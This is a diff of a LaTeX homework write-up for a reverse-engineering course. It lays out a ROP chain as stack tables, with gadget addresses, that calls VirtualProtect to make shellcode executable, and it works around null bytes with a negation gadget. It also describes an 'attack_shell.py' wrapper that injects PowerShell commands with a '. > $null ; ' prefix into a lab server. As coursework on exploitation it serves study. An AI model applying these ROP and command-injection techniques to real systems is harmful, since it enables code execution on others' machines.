@@ -52,7 +52,284 @@
 \author{Yosef Goren \& Tomer Bitan}
 \title{Reverse Engineering - Homework 4}
 \maketitle
+\tableofcontents
 
+\part{Dry}
+\section{}
+Its possible to find this sequence even in a legitimate DLL as part of a longer sequence
+for example in the assembly instruction \texttt{jmp 0xc364} the opcode will result in
+\texttt{e960c30000} for which the automatic search can locate 60c3 in the middle of the
+command.
+
+\section{}
+The first thing we need is to get the address of the location we wnat to jump to.
+To do that we need to reach\texttt{[[0x70707070]+1B]}.
+This can be done by setting \texttt{nop}'s all the way from the strcmy's buffer to the return
+address then given we know the address in the stack where our return address is we
+can mark it as X. draw the rest of the stack (with lower addresses at the bottom).
+
+\begin{center}
+    \begin{tabular}{|c|c|c|}
+        \hline
+        & \textbf{Stack (lower=bottom)} & \textbf{Explanation} \\
+        \hline
+        \hline
+        13 & \texttt{0x9ad9e716} & // load [[0x70707070]+1B] to eax \\
+        & & mov eax, DWORD PTR [eax+0Fh] \\
+        & & ret \\
+        \hline
+        12 & \texttt{0x9ad9e711} & inc eax //thirds part of add up to 1B-F \\
+        & & ret \\
+        \hline
+        11 & \texttt{0x9ad9e711} & inc eax //second part of add up to 1B-F \\
+        & & ret \\
+        \hline
+        10 & \texttt{0x9ad9e709} & mov ecx, eax //first part of add up to 1B-F \\
+        & & add ecx, 0Ah \\
+        & & mov eax, ecx \\
+        & & ret \\
+        \hline
+        9 & \texttt{0x9ad9e716} & mov eax, DWORD PTR [eax+0Fh] // load \\
+        & & [0x70707070] to eax \\
+        & & ret \\
+        \hline
+        8 & \texttt{0x15771690} & //junk \\
+        \hline
+        7 & \texttt{0x15771690} & //junk \\
+        \hline
+        6 & \texttt{0x15771690} & //junk \\
+        \hline
+        5 & \texttt{0x9ad9e700} & //place load address in eax and \\
+        & & junk in others \\
+        & & add eax, ebx\\ 
+        & & pop ebx \\
+        & & pop ecx \\
+        & & pop ebx \\
+        & & ret \\
+        \hline
+        4 & \texttt{0x9ad9e706} & //clear eax for jump \\
+        & & xor eax,eax \\
+        & & ret \\
+        \hline
+        3 & X+4 & //Current ebp location to make sure it doesnt \\
+        & & change when poped \\
+        \hline
+        2 & \texttt{0x70707061} & //0x70707070-0x0F \\
+        \hline
+        1 & \texttt{0x9ad9e713} & //load addres for first derefrence \\
+        & & pop ebx \\
+        & & pop ebp \\
+        & & ret \\
+        \hline        
+    \end{tabular}\\
+\end{center}
+Now that we have the address in eax we need to set up the parameters to call virtual
+protect to change the permissions.
+To do that will add on top of the previous stack to following:
+\begin{center}
+    \begin{tabular}{|c|c|c|}
+        \hline
+        & \textbf{Stack (lower=bottom)} & \textbf{Explanation} \\
+        \hline
+        \hline
+        24 & \texttt{0x00201010} & //arg 3 for Virtual protect indicates empty place \\
+        & & to copy previous permissions to \\
+        \hline
+        23 & \texttt{0x40000040} & //arg 2 for Virtual protect indicates permissions \\
+        & & to chenge to \\
+        \hline
+        22 & \texttt{0x00001000} & //arg 1 for Virtual protect indicates size of block \\
+        & & to change \\
+        \hline
+        21 & \texttt{0x9ad9e71c} & pushad //first push regs to bring eax to be arg0 \\
+        & & of later call \\
+        & & ret \\
+        \hline
+        20 & \texttt{0x9ad9e704} & //will later use to get to sep to ebp's content \\
+        \hline
+        19 & \texttt{0x9ad9e71a} & pop edi //place 0x9ad9e704 in edi \\
+        & & ret \\
+        \hline
+        18 & Virtual Protect Adress & //store there so that second pushad will place it \\
+        & & inplace \\
+        \hline
+        17 & \texttt{0x9ad9e71c} & //set up for second pushad \\
+        \hline
+        16 & \texttt{0x9ad9e703} & //set ebx to VirtualProtect address and ecx to \texttt{0x9ad9e71c} \\
+        & & pop ecx \\
+        & & pop ebx \\
+        & & ret \\
+        \hline
+        15 & \texttt{0x9ad9e702} & //after push we will use this to fill ebx and bring \\
+        & & esp to where ecx will be \\
+        \hline
+        14 & \texttt{0x9ad9e714} & pop ebp //place 0x9ad9e702 in ebp for later \\
+        & & ret \\
+        \hline        
+    \end{tabular}\\
+\end{center}
+To see that this stack’s ROP execution will result in a call to virtual protect we cal look at
+what the stack will change to once we reach execution of 21:
+(esp points to the bottom of our stack when returning from the load and goes up by two ,
+then by three then by two again. So we will reach the execution of 0x9ad9e71c (in 21)
+after executing 14,16, and 19in the order placed on the stack):
+\begin{center}
+    \begin{tabular}{|c|c|c|}
+        \hline
+        & \textbf{Stack (lower=bottom)} & \textbf{Explanation} \\
+        \hline
+        \hline
+        24 & \texttt{0x00201010} & //arg 3 for Virtual protect indicates empty place \\
+        & & to copy previous permissions to \\
+        \hline
+        23 & \texttt{0x40000040} & //arg 2 for Virtual protect indicates permissions \\
+        & & to chenge to \\
+        \hline
+        22 & \texttt{0x00001000} & //arg 1 for Virtual protect indicates size of block \\
+        & & to change \\
+        \hline
+        21 & \texttt{[[0x70707070]+1B]} (eax) & //pushed by pushad \\
+        \hline
+        20 & \texttt{0x9ad9e71c} (ecx) & // second call to 'pushad' to place eax as return \\
+        & & value for Virtual Protect \\
+        & & pushad \\
+        & & ret \\
+        \hline
+        19 & Junk (edx) & //unknown value left by pushad \\
+        \hline
+        18 & Virtual Protect Adress (ebx) & //set up for when the second call of pushad \\
+        & & moves this to be before eax \\
+        \hline
+        17 & Esp before 'pushad' & //value left by pushad \\
+        \hline
+        16 & \texttt{0x9ad9e702} (ebp) & // used to load VPA to ecx and move esp up 16 \\
+        & & bytes \\
+        & & pop ebx \\
+        & & pop ecx \\
+        & & pop ebx \\
+        & & ret \\
+        \hline
+        15 & Junk (esi) & //unknown value left by pushad \\
+        \hline
+        14 & \texttt{0x9ad9e704} (edi) & pop ebx //used to move esp up by 8 bytes \\
+        & & ret \\
+        \hline        
+    \end{tabular}\\
+\end{center}
+After the first ‘pushad’ call we will again have our esp point to the bottom this section (in
+the same place as before). We will again execute 14 then 16 then 20 and call
+0x9ad9e71c. Then finally our stack will look like this: with esp pointing to 13.
+
+\begin{center}
+    \begin{tabular}{|c|c|c|}
+        \hline
+        & \textbf{Stack (lower=bottom)} & \textbf{Explanation} \\
+        \hline
+        \hline
+        24 & \texttt{0x00201010} & //arg 3 for Virtual protect indicates empty place \\
+        & & to copy previous permissions to \\
+        \hline
+        23 & \texttt{0x40000040} & //arg 2 for Virtual protect indicates permissions \\
+        & & to chenge to \\
+        \hline
+        22 & \texttt{0x00001000} & //arg 1 for Virtual protect indicates size of block \\
+        & & to change \\
+        \hline
+        21 & \texttt{[[0x70707070]+1B]} (eax) & //pushed by pushad \\
+        \hline
+        20 & \texttt{[0x70707070]+1B]} (eax) & //pushed by second pushad \\
+        \hline
+        19 & Virtual Protect Adress (ecx) & //ready to call Virtual protect with ret address \\
+        & & eax and arguments 21-24 \\
+        \hline
+        18 & junk (edx) & //value left by pushad \\
+        \hline
+        17 & junk (edx) & //value left by pushad \\
+        \hline
+        16 & Esp before 'pushad' & //value left by pushad \\
+        \hline
+        15 & 0x9ad9e702 (ebp) & pop ebx // used to move esp up 16 bytes \\
+        & & pop ecx \\
+        & & pop ebx \\
+        & & ret \\
+        \hline
+        14 & Junk (esi) & //unknown value left by pushad \\
+        \hline
+        13 & \texttt{0x9ad9e704} (edi) & pop ebx //used to move esp up by 8 bytes \\
+        & & ret \\
+        \hline        
+    \end{tabular}
+\end{center}
+Now our jump to Virtual Protect is finally set up and we will have our esp points to 13 so
+is will execute 13 then 15 then 19 and jump to Virtual Protect.
+When returning from Virtual Protect we will automatically jump to our code in the new
+page because its in the return address.
+
+\section{}
+Our ROP didint work because in order to specify the size of the window we must have 4
+consecutive 0's however this will be interpreted but the Unicode strcpy as a NULL
+terminator and the string will cut off missing the last part of the permissions. Notice this
+wont be a problem with the the permission level argument because we chose to add the
+\texttt{PAGE\_TARGETS\_NO\_UPDATE} option which wont damage our ability to run code but will
+also not have a problem with parsing 0's since we will get \texttt{0x4000} and \texttt{0x0040}.
+
+\section{}
+o fix this problem with the new gadget we can replace the \texttt{0x00001000} argument with
+its negative \texttt{0xffff000} and place the call to the new gadget as such:
+\begin{center}
+    \begin{tabular}{|c|c|c|}
+        \hline
+        & \textbf{Stack (lower=bottom)} & \textbf{Explanation} \\
+        \hline
+        \hline
+        25 & \texttt{0x00201010} & //arg 3 for Virtual protect indicates empty place \\
+        & & to copy previous permissions to \\
+        \hline
+        24 & \texttt{0x40000040} & //arg 2 for Virtual protect indicates permissions \\
+        & & to chenge to \\
+        \hline
+        23 & \texttt{0xffff000} & //arg 1 for Virtual protect indicates size of block to change in negative \\
+        & & to change \\
+        \hline
+        22 & \texttt{0x9ad9e71c} & pushad //first push regs to bring eax to be arg0 \\
+        & & of later call \\
+        & & ret \\
+        \hline
+        21 & \texttt{0x6ad6e71d} & //negte the argument back to its original form \\
+        & & neg [esp + 04h] \\
+        & & ret \\
+        \hline
+        20 & \texttt{0x9ad9e704} & //will later use to get to sep to ebp's content \\
+        \hline
+        19 & \texttt{0x9ad9e71a} & pop edi //place 0x9ad9e704 in edi \\
+        & & ret \\
+        \hline
+        18 & Virtual Protect Adress & //store there so that second pushad will place it \\
+        & & inplace \\
+        \hline
+        17 & \texttt{0x9ad9e71c} & //set up for second pushad \\
+        \hline
+        16 & \texttt{0x9ad9e703} & //set ebx to VirtualProtect address and ecx to \texttt{0x9ad9e71c} \\
+        & & pop ecx \\
+        & & pop ebx \\
+        & & ret \\
+        \hline
+        15 & \texttt{0x9ad9e702} & //after push we will use this to fill ebx and bring \\
+        & & esp to where ecx will be \\
+        \hline
+        14 & \texttt{0x9ad9e714} & pop ebp //place 0x9ad9e702 in ebp for later \\
+        & & ret \\
+        \hline        
+    \end{tabular}\\
+\end{center}
+
+The execution with remain the same as before only this time once 21 is executed the
+esp will be pointing at 22 and so esp+4 will point at the argument we want to switch
+back. From that point once we return and call pushad everything will continue as before
+and the ROP will work.
+
+\part{Wet}
+\setcounter{section}{0}
 \section{}
 Skipped\dots
 \section{}
@@ -354,7 +631,7 @@ d-----        6/19/2023   3:52 PM                __pycache__
 
 In order to get this functionality in an interactive format,
 we have created a new python script to wrap the \texttt{run\_on\_input.py} script:
-we have called it \texttt{server\_shell.py}; it simply
+we have called it \texttt{attack\_shell.py}; it simply
 runs \texttt{run\_on\_input.py} as a subprocess 
 and gives it the input from the end user prefixed with '\texttt{. > \$null ; }'.\\
 Additionally - if it sees \texttt{exit} it terminates, and
@@ -384,6 +661,9 @@ cat config/attack.config
 \end{lstlisting}
 After doing this we see the file has the wanted content.\\
 
-We go to the side and Horray! The flames are off!\\
+Our \texttt{attack\_knights.py} file simply uses the server from the last part,
+and gives it the 5 shell commands from above.
+
+Horray! The flames in the site are off!\\
 
 \end{document}
